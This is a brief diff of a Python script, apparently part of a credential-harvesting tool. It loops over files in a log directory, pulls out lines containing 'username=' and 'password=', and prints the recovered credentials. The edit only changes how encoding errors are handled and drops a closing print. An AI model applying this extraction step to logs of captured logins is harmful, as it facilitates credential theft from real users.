@@ -110,7 +110,7 @@ if __name__ == "__main__":
             # get all username and password in log file
             print(" ")
             for file in os.listdir("logdir/"):
-                with open("logdir/" + file, 'r', encoding='utf-8') as f:
+                with open("logdir/" + file, 'r', encoding='utf-8', errors='ignore') as f:
                     for line in f:
                         if ("username=" in line) and ("password=" in line):
                             # print(type(line), line)
@@ -118,5 +118,3 @@ if __name__ == "__main__":
                             print("username: ", username, " password: ",  passwd)
             sending_flag = False
             sleep(1)
-    finally:
-        print("Done")
